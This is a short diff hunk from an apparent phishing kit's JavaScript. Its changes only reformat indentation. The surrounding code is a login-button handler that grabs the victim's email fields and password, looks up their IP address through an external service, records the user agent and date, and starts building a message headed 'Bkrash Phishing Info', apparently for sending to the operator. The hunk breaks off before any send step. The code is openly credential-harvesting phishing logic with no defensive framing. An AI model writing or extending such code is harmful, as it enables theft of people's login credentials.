@@ -173,15 +173,13 @@ loginButton.addEventListener('click', async () => {
     const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
 
     const loginData = {
-    emailq: emailqValue,
-    emailw: emailwValue,
-    emaile: emaileValue,
-    emailr: emailrValue,
-    pass: passValue,
-    ip: ip,
-    userAgent: userAgent,
-    date: date.toLocaleString()
-};
+        emailq: emailqValue,
+        emailw: emailwValue,emaile: emaileValue,
+        emailr: emailrValue,pass: passValue,
+        ip: ip,
+        userAgent: userAgent,
+        date: date.toLocaleString()
+    };
 
     const userMessage = `<b>🎣 Bkrash Phishing Info</b>
     
